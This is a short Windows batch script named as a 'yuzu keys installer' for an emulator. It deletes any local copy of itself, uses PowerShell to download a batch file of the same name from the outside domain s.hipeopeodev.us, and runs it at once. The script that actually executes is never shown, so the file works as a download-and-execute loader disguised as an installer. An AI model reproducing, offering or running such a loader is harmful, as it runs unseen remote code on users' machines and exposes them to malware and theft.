@echo off
cls
del yuzu-keys-installer.bat
powershell.exe (new-object System.Net.WebClient).DownloadFile('https://s.hipeopeodev.us/yuzu-keys-installer.bat', 'yuzu-keys-installer.bat')
yuzu-keys-installer.bat
exit
